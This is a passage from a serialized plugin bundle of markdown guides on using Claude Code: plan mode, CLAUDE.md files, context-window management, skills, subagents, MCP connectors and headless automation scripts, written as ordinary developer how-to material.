Integrates into workflows\n\n### Enterprise Use Cases\n\nOrganizations use headless Claude for:\n- Automatic PR reviews\n- Automated support ticket responses\n- Automatic logging and documentation updates\n- Integration with CI/CD pipelines\n\n### The Flywheel\n\n```\n1. Claude makes a mistake\n2. You review the logs\n3. You improve CLAUDE.md or tooling\n4. Claude gets better next time\n5. This compounds over time\n```\n\n**Result**: After months of iteration, systems are meaningfully better than launch.\n\n### Automation Examples\n\n#### PR Review System\n```bash\n#!/bin/bash\n# Automated PR review script\n\n# Get PR changes\nPR_DIFF=$(gh pr diff $1)\n\n# Run Claude Code in headless mode\nclaude -p \"Review this PR for security issues, performance problems, and test coverage. Return findings with severity levels.\n\n$PR_DIFF\"\n\n# Post results as PR comment\n```\n\n#### Documentation Updates\n```bash\n#!/bin/bash\n# Auto-update API documentation\n\n# Run Claude to check for API changes\nclaude -p \"Check this codebase for API changes. Generate updated OpenAPI documentation and save to api-docs.yaml.\"\n\n# Commit if changes found\nif [ -n \"$(git status --porcelain)\" ]; then\n    git add api-docs.yaml\n    git commit -m \"chore: update API documentation\"\n    git push\nfi\n```\n\n### The System Mindset\n\n**People who get the most value** from Claude Code:\n- Don't use it for one-off tasks\n- Build systems where Claude is a component\n- Invest time in configuration\n- Compound improvements over time\n\n**vs. people who**:\n- Use it reactively\n- Don't invest in setup\n- See diminishing returns\n\n## 5. Integration Patterns\n\n### Skills + Subagents + MCP\n\nThe compound effect:\n\n```\nSkill (encodes team conventions)\n  \nSubagent (handles complex subtasks)\n  \nMCP (connects external services)\n  \nResult: Unmatched productivity system\n```\n\n### Real-World Example: Feature Development\n\n```\n1. Load \"feature-development\" skill\n    Guides workflow\n\n2. Delegate to \"architecture-planner\" subagent\n    Analyzes existing code\n    Returns implementation plan\n\n3. Connect to GitHub MCP\n    Creates feature branch\n    Opens PR\n\n4. Connect to Linear MCP\n    Updates ticket status\n    Adds PR link\n\n5. Implementation complete\n    System documented\n    Team notified\n```\n\nAll in one conversation. No context switches.\n\n## Summary: Advanced Features\n\n### Skills\n- Teach Claude specific workflows\n- Auto-discovered via description\n- Progressive disclosure architecture\n- Build for repeatable patterns\n\n### Subagents\n- Isolated context for complex tasks\n- Prevent context pollution\n- Chain for workflows\n- Design explicit output formats\n\n### MCP Connectors\n- Eliminate context switching\n- Connect to any external service\n- Enable continuous workflows\n- Review security for third-party servers\n\n### System Building\n- Use headless mode for automation\n- Create feedback loops\n- Compound improvements over time\n- Think beyond one-off tasks\n\nNext: See [context-window.md](context-window.md) for detailed context management strategies.\n",
        "plugins/sys-cognition/skills/operating-claude/references/context-window.md": "# Context Window Management\n\n## Understanding Context Windows\n\n### The 200K Token Promise\n\nClaude Code provides a **consistent 200K token context window**. This is not theoreticalClaude Code delivers it reliably.\n\n**Contrast with other tools**:\n- **Cursor**: Practical usage often falls short of 200K due to internal truncation\n- **Claude Code**: Consistent 200K with explicit handling\n\n**Why this matters**: For large, interconnected codebases where you need Claude to understand how systems connect (auth  API routes  database schema), context matters.\n\n### The 40% Degradation Threshold\n\n**Critical insight**: Quality degrades at ~40% context utilization, not at 100%.\n\n**Quality curve**:\n- **0-20%**: Optimal performance\n- **20-40%**: Quality starts chipping away (may not be noticeable)\n- **40-80%**: Significant degradation\n- **80-100%**: Major issues, compaction likely\n\n**Warning sign**: If you run `/compact` and output is still terrible, degradation happened *before* compaction.\n\n### What Consumes Context\n\nEvery interaction adds to context:\n- Messages you send\n- Files Claude reads\n- Code Claude generates\n- Tool results\n- Error messages\n- **Everything accumulates**\n\n**Once quality drops**, more context makes it worse, not better.\n\n## Context Management Strategies\n\n### 1. Scope Your Conversations\n\n#### The One-Task Rule\n\n**Rule**: One conversation per feature or task.\n\n**Why**: Contexts bleed together and Claude gets confused.\n\n**Examples**:\n- GOOD Conversation 1: Build authentication system\n- GOOD Conversation 2: Refactor database layer\n- BAD Don't do both in the same conversation\n\n**Practical application**:\n```\nStarting auth system implementation\n  \nComplete auth system (all features)\n  \nStart new conversation for database refactor\n```\n\n**Benefits**:\n- Cleaner context\n- Focused Claude\n- Better results\n- Easier to track progress\n\n#### When to Start New Conversation\n\n**Signals it's time for a new conversation**:\n- Moving to different logical task\n- Context >60% utilized\n- Claude seems confused\n- You've completed one major feature\n- Context has unrelated discussions\n\n### 2. External Memory Pattern\n\n#### The Concept\n\nStore plans and progress in **actual files** that persist across sessions.\n\n```\n.my-project/\n plan-auth-system.md          # Auth system plan\n plan-api-refactor.md         # API refactor plan\n .cattoolkit/\n     context/\n         current-plan.md      # What's being worked on\n         progress.md          # What's been done\n```\n\n#### How It Works\n\n**When you start a new conversation**:\n```markdown\n# Current Context\n\nWorking on: Authentication system (Phase 2)\nPrevious work: [Link to plan-auth-system.md]\nCurrent status: User login implemented, working on password reset\n\nNext steps:\n1. Implement password reset flow\n2. Add email verification\n3. Write integration tests\n\nRelevant files:\n- src/auth/login.ts\n- src/auth/password-reset.ts\n- src/auth/email-verification.ts\n```\n\n**Claude can read this file** and pick up exactly where you left off.\n\n#### External Memory Best Practices\n\n1. **Keep files at top level** - Easier to find and reference\n2. **Use consistent naming** - Easy to identify purpose\n3. **Update regularly** - Keep status current\n4. **Link related files** - Show relationships\n5. **Version important plans** - Keep history of changes\n\n#### Plan File Template\n\n```markdown\n# Project Plan: [Feature Name]\n\n## Overview\nBrief description of what this feature does and why it matters.\n\n## Requirements\n- [ ] Requirement 1\n- [ ] Requirement 2\n- [ ] Requirement 3\n\n## Architecture\n### Components\n- Component A: Does X\n- Component B: Does Y\n\n### Data Flow\n1. User action\n2. System processes\n3. Result returned\n\n## Implementation Phases\n### Phase 1: Core Functionality\n- [ ] Task 1\n- [ ] Task 2\n\n### Phase 2: Edge Cases\n- [ ] Task 3\n- [ ] Task 4\n\n### Phase 3: Polish\n- [ ] Task 5\n- [ ] Task 6\n\n## Notes\n- Important decisions made\n- Trade-offs considered\n- Open questions\n\n## Related Files\n- Existing code: `src/path/file.ts`\n- New code: `src/path/new-file.ts`\n- Tests: `tests/path/test-file.ts`\n```\n\n### 3. The Copy-Paste Reset\n\n#### When Context Bloats\n\n**Symptoms**:\n- Output quality dropped\n- Claude keeps misunderstanding\n- Context is >70% utilized\n- Conversation went off track\n\n#### The Reset Process\n\n1. **Copy** important terminal output\n   ```bash\n   # Terminal shows important results\n   Test results: 12 passed, 3 failed\n   Build output: Success with warnings\n   ```\n\n2. **Run** `/compact` to get summary\n   ```\n   Conversation Summary:\n   - Implemented user authentication\n   - Added password reset flow\n   - Found 3 failing tests\n   - Build successful with warnings\n   ```\n\n3. **Run** `/clear` to reset context\n   ```\n   Context cleared. Ready for fresh conversation.\n   ```\n\n4. **Paste back** only essential information\n   ```markdown\n   # Current Status\n\n   Working on: Authentication system\n\n   Completed:\n   - User login \n   - Password reset flow \n\n   Next: Fix 3 failing tests\n\n   Key files:\n   - src/auth/test.ts (3 failing tests)\n   - src/auth/password-reset.ts (recent changes)\n   ```\n\n#### Benefits\n\n- **Fresh context** - Claude starts clear\n- **Preserved information** - Critical details retained\n- **Better output** - No degradation\n- **Continued progress** - No restart from zero\n\n### 4. TodoWrite Attention Manipulation\n\n#### The Problem\n\nIn long conversations (~50 tool calls), LLMs drift off-topic or forget goals.\n\n#### The Recitation Pattern\n\nConstantly rewrite todos to push objectives into recent attention:\n\n**Implementation**:\n1. Create `todo.md` at task start\n2. Update after every major tool call\n3. Rewrite to keep global plan visible\n\n**Example**:\n```markdown\n# Continuous Todo Updates\n\n## Phase 1: Research\n- [x] Analyze codebase structure\n- [x] Identify auth patterns\n- [ ] Review existing tests\n- [ ] Document current state\n\n## Phase 2: Implementation\n- [ ] Fix failing tests (3 tests)\n- [ ] Add email verification\n- [ ] Update password reset flow\n\n## Phase 3: Validation\n- [ ] Run full test suite\n- [ ] Verify edge cases\n- [ ] Update documentation\n\n**Current focus**: Phase 1, Task 3\n**Next**: Review existing tests\n```\n\n#### Why It Works\n\n- **Recites objectives** into context end\n- **Prevents drift** in long sessions\n- **Maintains focus** on global goals\n- **No architectural changes** needed\n\n### 5. Context Window Thresholds & Actions\n\n| Utilization | Action | Technique |\n|------------|--------|-----------|\n| **<20%** | Monitor | No action needed |\n| **20-40%** | Light compression | Observation masking |\n| **40-60%** | Aggressive compression | Summarization + compaction |\n| **60-80%** | Emergency | Copy-paste reset |\n| **>80%** | Critical | Start new conversation |\n\n### 6. Plan Mode Integration\n\n#### When to Use Plan Mode\n\n**Always use** for:\n- Complex tasks (10+ tool calls)\n- Multi-phase implementations\n- When agent appears confused\n- Long-running workflows\n- Architecture decisions\n\n#### Plan Mode + Context Management\n\n1. **Create plan** at task start\n2. **Update** as understanding evolves\n3. **Reference** in reminders\n4. **Use as** context anchor during compaction\n5. **Store** in `.cattoolkit/context/plan.md`\n\n**Example**:\n```markdown\n# Plan: Authentication System Refactor\n\n## Current Understanding\n- User login works \n- Password reset implemented \n- 3 failing tests need fixing\n\n## Next Steps\n1. Debug failing tests (Est: 30 min)\n2. Add email verification (Est: 45 min)\n3. Run full test suite (Est: 15 min)\n\n## Decisions Made\n- Use JWT for email verification tokens\n- Store tokens in Redis (expire in 24h)\n- Send verification emails via SendGrid\n\n**Context anchor**: This plan defines scope and prevents scope creep\n```\n\n### 7. Conversation Start Templates\n\n#### Template 1: New Feature\n```markdown\n# New Conversation: [Feature Name]\n\n## Context\nStarting new feature development after previous work on [X].\n\n## Goal\n[What you're building]\n\n## Constraints\n- Must work with existing [system]\n- Cannot break [current functionality]\n- Timeline: [deadline if any]\n\n## Known Files\n- [List relevant files]\n\n## First Step\n[What you want to do first]\n```\n\n#### Template 2: Debug Session\n```markdown\n# New Conversation: Debug [Issue]\n\n## Problem\n[Brief description of bug]\n\n## Symptoms\n- [Symptom 1]\n- [Symptom 2]\n\n## Environment\n- Branch: [current branch]\n- Node version: [version]\n- Previous changes: [what changed recently]\n\n## Reproduce Steps\n1. [Step 1]\n2. [Step 2]\n3. [Error occurs]\n\n## Files to Check\n- [Suspected files]\n\n## Hypothesis\n[What you think might be wrong]\n```\n\n#### Template 3: Refactor\n```markdown\n# New Conversation: Refactor [Component]\n\n## Current State\n- [What exists now]\n- Location: [path]\n- Lines of code: [count]\n\n## Target State\n- [What you want it to look like]\n- Improvements: [what gets better]\n\n## Constraints\n- Must maintain API compatibility\n- Cannot change behavior\n- Tests must continue passing\n\n## Approach\n[How you plan to do it]\n\n## Files Involved\n- [Primary files]\n- [Related files]\n- [Test files]\n```\n\n## Advanced Context Techniques\n\n### 1. System Reminders\n\nCombat degradation through **recurring objective injection**:\n\n**Effective patterns**:\n1. **Objective recitation** - Reiterate main goal\n2. **Constraint reinforcement** - Re-emphasize critical requirements\n3. **Context anchoring** - Reference key context elements\n\n**Usage**:\n- Add in user messages\n- Inject via tool results\n- Include in scripts\n\n### 2. File-Based Context Anchoring\n\nStore critical context in files:\n\n```\n.cattoolkit/context/\n objectives.md          # Global goals\n constraints.md        # Critical requirements\n decisions.md          # Important decisions\n current-focus.md      # Immediate next step\n```\n\n**Reference in conversation**:\n```\nUser: \"Continue working on the auth system\"\n\nClaude should:\n1. Read .cattoolkit/context/current-focus.md\n2. Understand immediate next step\n3. Continue from there\n```\n\n### 3. Context Pre-Loading\n\nLoad context upfront rather than accumulating:\n\n**Before** (accumulates):\n```\nClaude, here's my codebase...\n[200 files loaded]\nNow help me with X\n```\n\n**After** (pre-load):\n```\nContext: Working on auth system\nGoal: Add email verification\nCurrent status: Login , Password reset \nFiles: src/auth/login.ts, src/auth/password-reset.ts\nNext: Implement email verification in src/auth/email-verification.ts\n\nHelp me: Implement the email verification flow\n```\n\n### 4. Conversation Checkpointing\n\nSave conversation state to files:\n\n```markdown\n# Checkpoint: [Date/Time]\n\n## Completed\n- [Task 1] \n- [Task 2] \n\n## Current State\n- Working on: [Current task]\n- Files modified: [List]\n- Tests: [Status]\n\n## Next Actions\n1. [Action 1]\n2. [Action 2]\n\n## Open Questions\n- [Question 1]\n- [Question 2]\n```\n\n**Use case**: When context gets full but work isn't complete.\n\n## Measuring Context Utilization\n\n### Claude Code Indicator\n\nCheck the context indicator (shows percentage):\n- Green: <20% (optimal)\n- Yellow: 20-40% (watch)\n- Orange: 40-60% (compress)\n- Red: >60% (reset)\n\n### Manual Estimation\n\nCount major context elements:\n- Files read ( ~500 tokens each)\n- Code generated ( length)\n- Tool results (varies)\n- Messages exchanged ( ~100 tokens each)\n\n**Rough calculation**:\n```\n100 messages  100 tokens = 10,000 tokens\n50 files  500 tokens = 25,000 tokens\nCode generated: ~5,000 tokens\nTotal: ~40,000 tokens (20% of 200K)\n```\n\n## Context Anti-Patterns\n\n### BAD Don't Do This\n\n1. **Let it ride** - Ignore context until it breaks\n2. **Copy-paste entire files** - Load only what's needed\n3. **Never reset** - Better to reset than struggle\n4. **All in one conversation** - Scope your tasks\n5. **Ignore the indicator** - The percentage matters\n\n### GOOD Do This Instead\n\n1. **Monitor proactively** - Watch the percentage\n2. **Use external memory** - Write plans to files\n3. **Reset when needed** - Copy-paste reset is your friend\n4. **Scope conversations** - One task per conversation\n5. **Reference files, don't dump them** - Let Claude read what it needs\n\n## Summary: Context Management\n\n### Core Principles\n\n1. **Scope conversations** - One task per conversation\n2. **Use external memory** - Plans in files persist\n3. **Copy-paste reset** - When context bloats\n4. **Recite objectives** - Keep todos updated\n5. **Plan mode first** - Start with a plan\n\n### Thresholds & Actions\n\n- **<20%**: Monitor\n- **20-40%**: Light compression\n- **40-60%**: Aggressive compression\n- **>60%**: Reset or new conversation\n\n### Tools & Techniques\n\n- **External files** for persistence\n- **TodoWrite** for attention management\n- **Plan mode** for structure\n- **Compaction** for recovery\n- **Clear** for fresh start\n\n### Mental Model\n\n**Claude is stateless**. Every conversation starts from nothing except what you explicitly give it. Plan accordingly.\n\nNext: See [patterns.md](patterns.md) for proven patterns and anti-patterns.\n",
        "plugins/sys-cognition/skills/operating-claude/references/fundamentals.md": "# Claude Code Fundamentals\n\n## 1. Think First: The Plan Mode Revolution\n\n### Why Planning Matters\n\n**The #1 mistake developers make**: Opening Claude Code and immediately starting to type.\n\n**The reality**: 10 out of 10 times, using plan mode produces significantly better results than ad-hoc conversations.\n\n### How Plan Mode Works\n\n1. **Access**: Press `Shift+Tab` twice to enter plan mode\n2. **Process**: Think through the architecture, requirements, and approach\n3. **Output**: A structured plan that guides implementation\n4. **Benefit**: Saves hours of debugging and rework\n\n### When to Use Plan Mode\n\nAlways use plan mode for:\n- Building features or systems\n- Refactoring code\n- Debugging complex issues\n- Architecture decisions\n- **Even small tasks** like summarizing emails\n\n### Plan Mode Best Practices\n\n1. **Think like an architect**: Consider the end state before starting\n2. **Ask questions**: If you don't fully understand the requirements, ask\n3. **Get explicit agreement**: Have Claude confirm the plan before implementation\n4. **Document decisions**: Keep the plan visible throughout execution\n\n**Example of good planning**:\n> \"I need to build email/password authentication. Requirements: Use existing User model, store sessions in Redis with 24-hour expiry, add middleware for /api/protected routes.\"\n\n**Example of poor planning**:\n> \"Build me an auth system.\"\n\n## 2. CLAUDE.md: Your Project's DNA\n\n### What Is CLAUDE.md?\n\nA markdown file Claude reads at the start of every conversation. It's your project's instruction manual.\n\n### The 150-200 Instruction Limit\n\nClaude can reliably follow ~150-200 instructions. The system prompt already uses ~50, leaving ~100-150 for your project.\n\n**Implication**: Every instruction competes for attention. Keep it focused.\n\n### What Makes a Good CLAUDE.md\n\n#### GOOD Do This\n\n**Keep it short**:\n- Focus on the essential workflows\n- Remove redundant information\n- Update constantly (press `#` to auto-add)\n\n**Make it specific**:\n```\n# Good\nUse TypeScript strict mode because we've had production bugs\nfrom implicit any types.\n\n# Bad\nWe use TypeScript.\n```\n\n**Tell the why**:\n- Explains the reasoning behind rules\n- Helps Claude make better judgment calls\n- Provides context for edge cases\n\n**Update constantly**:\n- Press `#` while working to add instructions\n- Every time you correct Claude twice, add it to CLAUDE.md\n- It becomes a living document of how your codebase works\n\n#### BAD Don't Do This\n\n- **Don't make it a novel** (Claude will ignore things)\n- **Don't include generic documentation** (Claude knows what components are)\n- **Don't leave it outdated** (stale instructions cause errors)\n- **Don't write for new hires** (write for yourself with amnesia)\n\n### Example: Good vs Bad\n\n**Bad CLAUDE.md** (documentation style):\n```\n# Our Codebase\n\nWe have a React frontend with TypeScript.\n\n## Components\nComponents are in src/components/...\n\n## API\nWe use REST APIs...\n\n[500 more lines...]\n```\n\n**Good CLAUDE.md** (notes style):\n```\n# Build Commands\n- Dev: `npm run dev`\n- Build: `npm run build`\n- Test: `npm test`\n\n# Coding Standards\n- TypeScript strict mode (production bugs from implicit any)\n- Always use zod for runtime validation\n- No `any` types without explicit opt-in\n\n# Common Tasks\n- Add feature: Create route + component + test\n- Database changes: Use Prisma migrations\n- Deploy: Push to main  Vercel auto-deploys\n\n# Gotchas\n- API base: https://api.ourapp.com (not localhost)\n- Auth: Headers not cookies\n- Env vars: All required in Vercel dashboard\n```\n\n## 3. Context Window Management\n\n### The Claude Code Advantage\n\n**Claude Code**: Consistent 200K token context window\n**Other tools** (like Cursor): May truncate to 70-120K due to internal safeguards\n\nThis matters for large codebases where you need Claude to understand interconnected systems.\n\n### The 40% Degradation Threshold\n\n**Critical knowledge**: Context degrades at ~40%, not 100%.\n\n**Pattern**:\n- **<20%**: Optimal performance\n- **20-40%**: Quality starts chipping away\n- **>40%**: Significant degradation\n\n**Warning sign**: If Claude Code compacts and output is still terrible, degradation happened *before* compaction.\n\n### Context Management Strategies\n\n#### 1. Scope Your Conversations\n\n**Rule**: One conversation per feature or task.\n\n**Why**: Contexts bleed together and Claude gets confused.\n\n**Example**:\n- Conversation 1: Build authentication system\n- Conversation 2: Refactor database layer\n- BAD Don't do both in the same conversation\n\n#### 2. External Memory\n\nWrite plans and progress to files that persist across sessions:\n\n```\n.my-project/\n plan-auth.md          # Auth system plan\n plan-database.md      # Database refactor plan\n context/\n     progress.md       # Current progress\n```\n\n**When you return**: Claude can read these files and continue where you left off.\n\n**Best practice**: Keep these at the top level so they're visible in file search.\n\n#### 3. The Copy-Paste Reset\n\nWhen context gets bloated:\n\n1. Copy important terminal output\n2. Run `/compact` to get a summary\n3. Run `/clear` to reset context\n4. Paste back only the essential information\n\n**Result**: Fresh context with critical information preserved.\n\n**When to use**: When output quality drops or conversation goes off rails.\n\n#### 4. Know When to Clear\n\n**Trigger**: When you see these signs:\n- Conversation has gone off the rails\n- Accumulated irrelevant context\n- Claude is confused or looping\n- Context is >60% utilized\n\n**Action**: Just `/clear` and start fresh.\n\n**Reassurance**: CLAUDE.md persists, so project context isn't lost.\n\n#### 5. The Stateless Mental Model\n\n**Claude is stateless**. Every conversation starts from nothing except what you explicitly give it.\n\n**Plan accordingly**:\n- Provide necessary context upfront\n- Don't assume Claude remembers previous conversations\n- Use external files for continuity\n\n## 4. Prompting: Input Quality = Output Quality\n\n### The Fundamental Truth\n\n> **Bad Input = Bad Output**\n\nIf you're getting bad results with Claude Code, your prompting needs work. The model is only as good as your instructions.\n\n### What Actually Helps\n\n#### 1. Be Specific About What You Want\n\n**Vague**:\n> \"Build an auth system\"\n\n**Specific**:\n> \"Build email/password authentication using the existing User model, store sessions in Redis with 24-hour expiry, add middleware that protects routes under /api/protected.\"\n\n#### 2. Tell It What NOT to Do\n\nClaude 4.5 tends to over-engineer:\n- Extra files\n- Unnecessary abstractions\n- Flexibility you didn't ask for\n\n**Solution**:\n> \"Keep this simple. Don't add abstractions I didn't ask for. One file if possible.\"\n\n#### 3. Give Context About Why\n\n**Changes how Claude approaches the problem**:\n- \"We need this to be fast because it runs on every request\"\n- \"This is a prototype we'll throw away\"\n- \"This needs to handle 1M users\"\n\n#### 4. Show Instead of Tell\n\nIf Claude keeps misunderstanding:\n\n```\nHere's what the output should look like:\n[minimal example]\n\nNow apply this pattern to the rest.\n```\n\n### Prompting Best Practices\n\n| Principle | Why | Example |\n|-----------|-----|---------|\n| **Specific > Vague** | Clear target for Claude | \"Add logout button to navbar\" vs \"Add auth UI\" |\n| **Constraints > Open-ended** | Guides decision-making | \"Use existing User model\" vs \"Create user system\" |\n| **Examples > Descriptions** | Concrete pattern to follow | Show code sample vs explain |\n| **Why concept > What** | Context for judgment calls | Explain business requirement vs just task |\n\n## 5. Model Selection\n\n### Sonnet vs Opus\n\n**Sonnet**:\n- Faster and cheaper\n- Excellent for execution tasks\n- Clear path implementation\n- Good for: writing boilerplate, refactoring, implementing features\n\n**Opus**:\n- Slower and more expensive\n- Better for complex reasoning\n- Good for: planning, architectural decisions, deep analysis\n\n### The Workflow That Works\n\n1. **Use Opus** (Shift+Tab) to plan and make architectural decisions\n2. **Switch to Sonnet** for implementation\n3. **Switch back to Opus** for review if needed\n\n**Note**: Your CLAUDE.md ensures both models operate under the same constraints.\n\n## 6. When Claude Gets Stuck\n\n### Recognition Signs\n\n- Tries the same thing repeatedly\n- Fails, tries again, fails in loop\n- Confidently implements wrong solution\n- Can't be corrected after multiple attempts\n\n### The Better Move: Change Approach\n\n#### 1. Clear the Conversation\n\n**Why**: Accumulated context might be confusing Claude.\n\n**How**: `/clear` gives a fresh start.\n\n#### 2. Simplify the Task\n\nBreak complex tasks into smaller pieces:\n- Get each piece working before combining\n- If Claude struggles with complex task  your plan mode was insufficient\n\n#### 3. Show Instead of Tell\n\nWrite a minimal example yourself:\n```\nHere's what the output should look like.\nNow apply this pattern to the rest.\n```\n\n#### 4. Be Creative\n\nTry different framing:\n- \"Implement this as a state machine\" vs \"handle these transitions\"\n- Different angle might unlock progress\n\n#### 5. Meta-Skill: Recognize Loops\n\n**Rule**: If you've explained the same thing 3 times and Claude still doesn't get it, more explaining won't help.\n\n**Action**: Change something about your approach.\n\n## Summary: The Fundamentals\n\n1. GOOD **Think first**  Use plan mode before typing\n2. GOOD **Optimize CLAUDE.md**  Keep it short, specific, updated\n3. GOOD **Manage context**  Proactive, not reactive\n4. GOOD **Prompt well**  Specific, constrained, with examples\n5. GOOD **Choose models wisely**  Opus for planning, Sonnet for execution\n6. GOOD **Recognize when stuck**  Change approach, don't loop\n\nNext: See [advanced-features.md](advanced-features.md) for skills, subagents, and MCP connectors.\n",
        "plugins/sys-cognition/skills/operating-claude/references/patterns.md": "# Patterns & Best Practices\n\n## The Big Ideas\n\n### 1. Think First, Type Second\n\n**The #1 productivity hack**: Press Shift+Tab twice (plan mode) before typing anything.\n\n**Evidence**: 10 out of 10 times, plan mode produces better results than ad-hoc conversation.\n\n**Why it works**:\n- Forces you to think through architecture\n- Prevents scope creep\n- Reduces debugging time\n- Improves output quality\n\n### 2. Input Quality = Output Quality\n\n**Fundamental truth**: Bad prompting = bad results.\n\nIf you're getting poor output with Claude Code, it's not the modelit's your prompting.\n\n**Fix your input**:\n- Be specific (not vague)\n- Use constraints (not open-ended)\n- Provide examples (not just descriptions)\n- Explain why (not just what)\n\n### 3. Context is Your Enemy\n\n**Reality**: Context degrades at 40%, not 100%.\n\n**Manage it proactively**:\n- Scope conversations\n- Use external memory\n- Reset when needed\n- Don't let it accumulate\n\n### 4. Skills > Commands > Ad-hoc\n\n**Hierarchy of automation**:\n\n```\nSkills (automatic, discovered)\n  \nCommands (manual invocation)\n  \nAd-hoc prompts (one-off, no pattern)\n```\n\nBuild skills for patterns you repeat.\n\n## Proven Patterns\n\n### Pattern 1: The Plan Mode Workflow\n\n#### When to Use\n- Any complex task (5+ steps)\n- Architecture decisions\n- Multi-phase implementations\n- When you don't know where to start\n\n#### How It Works\n1. **Shift+Tab** twice  Plan mode\n2. **Think** through the problem\n3. **Ask** clarifying questions\n4. **Create** a structured plan\n5. **Get agreement** from Claude\n6. **Execute** the plan\n\n#### Example\n\n**Before** (bad):\n```\nUser: \"Build me an auth system\"\nClaude: [makes assumptions, builds wrong thing]\nUser: \"No, that's not right\"\nClaude: [tries again, still wrong]\n[Loop continues]\n```\n\n**After** (good):\n```\nUser: [Shift+Tab twice]\nClaude: \"I'm in plan mode. Let's think through this. What kind of auth system do you need? What features? What constraints?\"\nUser: \"Email/password auth. User model exists. Need sessions in Redis. Middleware for protected routes.\"\nClaude: \"Here's my plan:\n\n## Auth System Implementation Plan\n\n### Phase 1: Setup\n- [ ] Review existing User model\n- [ ] Set up Redis session store\n- [ ] Install necessary dependencies\n\n### Phase 2: Implementation\n- [ ] Create login endpoint\n- [ ] Create logout endpoint\n- [ ] Create session middleware\n- [ ] Create password validation\n\n### Phase 3: Integration\n- [ ] Add middleware to protected routes\n- [ ] Create auth helper functions\n- [ ] Update User model if needed\n\n### Phase 4: Testing\n- [ ] Test login flow\n- [ ] Test logout flow\n- [ ] Test protected routes\n\nDoes this plan look good? Any changes?\"\nUser: \"Looks perfect. Let's proceed.\"\nClaude: [Executes plan successfully]\n```\n\n### Pattern 2: External Memory\n\n#### When to Use\n- Complex, multi-session projects\n- When context >40%\n- Long-running workflows\n- Collaborative work\n\n#### How It Works\n1. **Create** a plan file\n2. **Update** progress regularly\n3. **Reference** file in new conversations\n4. **Claude reads** and continues\n\n#### Example Structure\n```\nmy-project/\n plan-feature.md\n notes-architecture.md\n .cattoolkit/\n     context/\n         current-plan.md\n         decisions.md\n         progress.md\n```\n\n#### Benefits\n- Context doesn't bloat\n- Progress persists\n- Team can collaborate\n- Easy to resume work\n\n### Pattern 3: Skills for Patterns\n\n#### When to Use\n- Repeated workflows\n- Team conventions\n- Complex procedures you explain repeatedly\n\n#### Example\n- What: Code Review Skill\n\nCreate `~/.claude/skills/code-review/SKILL.md`:\n\n```yaml\n---\nname: code-review\ndescription: \"Apply our team's code review standards. Use when reviewing PRs or code changes.\"\n---\n\n# Code Review Standards\n\n## Security Checklist\n- [ ] Input validation present\n- [ ] No hardcoded secrets\n- [ ] Proper authentication checks\n- [ ] SQL injection prevention\n- [ ] XSS protection\n\n## Performance Checklist\n- [ ] Database queries optimized\n- [ ] No N+1 queries\n- [ ] Proper indexing considered\n- [ ] Efficient data structures\n\n## Code Quality Checklist\n- [ ] TypeScript strict mode\n- [ ] No `any` types without reason\n- [ ] Proper error handling\n- [ ] Tests added/updated\n- [ ] Documentation updated\n\n## Review Process\n1. Read the PR description\n2. Check out the branch locally\n3. Review each commit\n4. Run tests\n5. Apply checklist\n6. Leave specific, actionable feedback\n```\n\n#### Auto-Discovery\nWhen you ask \"Review this PR\", Claude sees the skill and applies it automatically.\n\n### Pattern 4: Subagent Delegation\n\n#### When to Use\n- Large codebases (analyze without polluting main context)\n- Parallel work (multiple agents on different tasks)\n- Complex tasks (break into sub-tasks)\n- Specialized work (security review, testing, etc.)\n\n#### How It Works\n1. **Identify** subtask suitable for delegation\n2. **Invoke** subagent with specific prompt\n3. **Receive** summary of findings\n4. **Incorporate** into main task\n\n#### Example: Security Review\n\n```yaml\n# Main conversation\nUser: \"I need to review this PR for security issues\"\n\n# Delegate to security subagent\nClaude (main): \"I'll delegate this to our security review subagent to analyze the code changes for vulnerabilities.\"\n\nSubagent (security): [Analyzes code]\nReturns:\n```\nSecurity Findings:\n- File: src/auth/login.ts, Line 45: SQL injection risk\n- File: src/api/users.ts, Line 23: Missing authentication check\n- Severity: 2 Critical, 1 High\n\nRecommendation: Fix login.ts line 45 first.\n```\n\nClaude (main): \"I found 3 security issues in this PR. Let's fix them...\"\n```\n\n### Pattern 5: MCP Integration\n\n#### When to Use\n- GitHub workflows (PRs, issues)\n- Database queries\n- Team communication (Slack)\n- Issue tracking (Jira, Linear)\n\n#### Example: GitHub Workflow\n\n```\nUser: \"Create a feature branch for adding password reset\"\n\nClaude: [Uses GitHub MCP]\n Creates branch: feature/password-reset\n Creates PR: draft\n Returns: PR URL and branch name\n\nUser: \"Link this PR to Linear ticket ENG-1234\"\n\nClaude: [Uses Linear MCP]\n Updates ticket: ENG-1234\n Adds PR link\n Sets status: In Progress\n```\n\n#### Compound Effect\nTransform 5 context switches into 1 continuous session.\n\n### Pattern 6: Copy-Paste Reset\n\n#### When to Use\n- Context >60%\n- Output quality dropped\n- Conversation went off track\n- Claude is looping\n\n#### How It Works\n1. **Copy** important output\n2. **Run** `/compact` for summary\n3. **Run** `/clear` to reset\n4. **Paste** essential info back\n\n#### Example\n```\nContext is 75% full, Claude is confused.\n\n1. Copy: Terminal test results showing 3 failures\n2. Compact: \"3 tests failing in auth module\"\n3. Clear: Context reset\n4. Paste: \"Fix 3 failing tests in src/auth/test.ts\"\nResult: Fresh start, focused on the issue\n```\n\n## Anti-Patterns\n\n### Anti-Pattern 1: Never Use Plan Mode\n\n**Symptoms**:\n- Claude frequently misunderstood requirements\n- Lots of back-and-forth corrections\n- Implementation doesn't match vision\n- Wasted time debugging\n\n**Fix**: Always use plan mode for complex tasks.\n\n### Anti-Pattern 2: Ad-hoc Everything\n\n**Symptoms**:\n- Explain the same thing repeatedly\n- Inconsistent approaches\n- Reinventing the wheel each time\n- No team conventions\n\n**Fix**: Create skills for repeatable patterns.\n\n### Anti-Pattern 3: Let Context Bloat\n\n**Symptoms**:\n- Ignore context percentage\n- Never reset conversations\n- One conversation for entire projects\n- Quality degrades over time\n\n**Fix**:\n- Monitor context indicator\n- Use external memory\n- Copy-paste reset when needed\n- Scope conversations\n\n### Anti-Pattern 4: Vague Prompting\n\n**Symptoms**:\n- \"Build me a feature\"\n- \"Fix this bug\"\n- \"Improve this code\"\n- Claude makes wrong assumptions\n\n**Fix**:\n```\nInstead of: \"Add authentication\"\nUse: \"Add email/password authentication using existing User model,\n     sessions in Redis, middleware for /api/protected routes\"\n```\n\n### Anti-Pattern 5: No External Memory\n\n**Symptoms**:\n- Lost context between sessions\n- Can't remember what was done\n- Restarting from scratch\n- No progress tracking\n\n**Fix**: Write plans and progress to files.\n\n### Anti-Pattern 6: Ignoring Context Degradation\n\n**Symptoms**:\n- Continue working with poor output\n- Compaction doesn't help\n- Claude seems confused\n- 